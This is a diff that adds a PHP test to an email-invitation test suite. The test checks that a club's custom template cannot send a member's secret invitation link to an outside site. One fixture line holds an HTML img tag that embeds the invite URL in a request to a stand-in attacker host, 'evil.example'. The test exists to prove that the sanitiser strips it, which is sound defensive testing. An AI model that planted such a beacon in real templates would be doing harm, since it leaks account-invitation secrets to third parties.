@@ -361,6 +361,20 @@ class MemberAccountInvitationTest extends TestCase
         $this->assertSame('Welcome to the lodge', $custom->envelope()->subject);
     }
 
+    public function test_a_lodge_template_cannot_send_the_invitation_link_to_another_site(): void
+    {
+        $this->seedInvitationTemplate();
+        $user = User::factory()->create(['name' => 'Jane']);
+        // Stored as if saved before the sanitizer removed it, so the check when the email is filled in is tested too.
+        ClubEmailTemplate::create(['club_id' => $this->club->id, 'template_key' => 'account_invitation', 'subject' => 'Welcome', 'body_html' => '<p><img src="https://evil.example/p/{{invite_url}}"> <a href="{{invite_url}}">Accept</a></p>']);
+
+        $mail = new MemberInvitationMail($this->club->fresh(), $user, 'tok', 'https://example.test/accept-secret', $this->admin);
+
+        $mail->assertSeeInHtml('src="https://evil.example/p/"', false);
+        $mail->assertSeeInHtml('href="https://example.test/accept-secret"', false);
+        $this->assertStringNotContainsString('evil.example/p/https', $mail->render());
+    }
+
     private function seedInvitationTemplate(): void
     {
         DB::table('default_email_templates')->updateOrInsert(['template_key' => 'account_invitation'], [
